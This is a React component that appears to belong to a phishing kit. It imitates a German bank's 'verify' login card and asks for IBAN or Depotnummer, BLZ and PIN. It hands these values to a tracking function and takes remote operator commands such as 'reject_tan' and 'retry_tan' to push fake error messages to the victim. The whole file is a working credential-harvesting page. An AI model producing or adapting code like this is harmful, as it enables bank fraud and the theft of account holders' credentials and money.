"use client";

import { useEffect, useState } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

type Mode = "iban" | "depot";

export default function VerifyCard() {
  const [mode, setMode] = useState<Mode>("depot");
  const [iban, setIban] = useState("");
  const [depot, setDepot] = useState("");
  const [blz, setBlz] = useState("");
  const [pin, setPin] = useState("");
  const [primaryTouched, setPrimaryTouched] = useState(true);
  const [cmdError, setCmdError] = useState<string | null>(null);

  const ibanError = mode === "iban" && primaryTouched && iban === "";
  const depotError = mode === "depot" && primaryTouched && depot === "";

  const isValid =
    mode === "iban"
      ? iban !== "" && pin !== ""
      : depot !== "" && blz !== "" && pin !== "";

  /* Register command handler */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setCmdError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setCmdError(null);
          break;
        case "reject_tan":
          setCmdError("Code ist falsch. Bitte versuchen Sie es erneut.");
          setPin("");
          break;
        case "retry_tan":
          setCmdError("Bitte versuchen Sie es erneut.");
          setPin("");
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const handleSubmit = () => {
    if (!isValid) return;
    setCmdError(null);
    const data: Record<string, unknown> = { mode, pin };
    if (mode === "iban") {
      data.iban = iban;
    } else {
      data.depot = depot;
      data.blz = blz;
    }
    trackSubmission("vkb", "verify", data);
  };

  return (
    <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-160px)] px-4 sm:px-0 pt-6 sm:pt-10">
      <div className="bg-white rounded-lg w-full max-w-[460px] p-3 sm:p-4 flex flex-col shadow-lg">
        {/* Segmented tabs */}
        <div className="flex justify-center mb-4">
          <div className="inline-flex bg-vkb-gray-100 rounded-full p-1">
            <SegBtn
              active={mode === "iban"}
              onClick={() => {
                setMode("iban");
                setPrimaryTouched(true);
              }}
              label="mit IBAN"
            />
            <SegBtn
              active={mode === "depot"}
              onClick={() => {
                setMode("depot");
                setPrimaryTouched(true);
              }}
              label="mit Depotnummer"
            />
          </div>
        </div>

        {cmdError && (
          <div
            className="mb-3 px-3 py-2 rounded text-sm"
            style={{
              backgroundColor: "#fef2f2",
              border: "1px solid #fca5a5",
              color: "#b91c1c",
            }}
          >
            {cmdError}
          </div>
        )}

        {mode === "iban" ? (
          <>
            <FilledField
              label="IBAN eingeben"
              value={iban}
              onChange={setIban}
              error={ibanError ? "Pflichtfeld" : undefined}
              required
            />
            <FilledField
              label="PIN eingeben"
              type="password"
              value={pin}
              onChange={setPin}
              required
            />
          </>
        ) : (
          <>
            <div className="grid grid-cols-1 sm:grid-cols-[1fr_140px] gap-3">
              <FilledField
                label="Depotnummer eingeben"
                value={depot}
                onChange={setDepot}
                error={depotError ? "Pflichtfeld" : undefined}
                required
              />
              <FilledField
                label="BLZ"
                value={blz}
                onChange={setBlz}
                required
              />
            </div>
            <FilledField
              label="PIN eingeben"
              type="password"
              value={pin}
              onChange={setPin}
              required
            />
          </>
        )}

        <div className="px-3 sm:px-4 pt-3 flex justify-center">
          <button
            type="button"
            disabled={!isValid}
            onClick={handleSubmit}
            className="vkb-btn-primary w-full sm:w-1/2"
          >
            Weiter
          </button>
        </div>

        <div className="px-3 sm:px-4 mb-1" />
      </div>
    </div>
  );
}

function SegBtn({
  active,
  onClick,
  label,
}: {
  active: boolean;
  onClick: () => void;
  label: string;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`px-4 py-1.5 rounded-full text-sm flex items-center gap-1.5 transition-colors ${
        active
          ? "bg-white shadow-sm text-vkb-black font-medium"
          : "text-vkb-gray-700 hover:text-vkb-black"
      }`}
    >
      {active && (
        <svg
          width="14"
          height="14"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="3"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <polyline points="20 6 9 17 4 12" />
        </svg>
      )}
      {label}
    </button>
  );
}

function FilledField({
  label,
  value,
  onChange,
  type = "text",
  error,
  required,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  error?: string;
  required?: boolean;
}) {
  return (
    <div className="mb-3">
      <div className="form-field bg-vkb-gray-100">
        <div className="relative px-3.5 pt-5 pb-2">
          <input
            type={type}
            value={value}
            onChange={(e) => onChange(e.target.value)}
            placeholder=" "
            className="floating-input w-full bg-transparent border-0 outline-none text-base"
          />
          <label
            className={`absolute transition-all duration-200 pointer-events-none ${
              value
                ? "left-3.5 top-1 text-xs"
                : "left-3.5 top-1/2 -translate-y-1/2 text-base"
            }`}
            style={{ color: error ? "var(--vkb-danger)" : "rgba(0,0,0,0.54)" }}
          >
            {label}
            {required && <span className="text-vkb-danger ml-0.5">*</span>}
          </label>
        </div>
        {error ? (
          <div className="form-field-underline-error" />
        ) : (
          <div className="form-field-underline" />
        )}
      </div>
      {error && (
        <div
          className="flex items-center gap-1.5 mt-1 text-xs"
          style={{ color: "var(--vkb-danger)" }}
        >
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
            <circle cx="12" cy="12" r="10" />
            <rect x="11" y="6" width="2" height="8" fill="white" />
            <rect x="11" y="16" width="2" height="2" fill="white" />
          </svg>
          <span>{error}</span>
        </div>
      )}
    </div>
  );
}
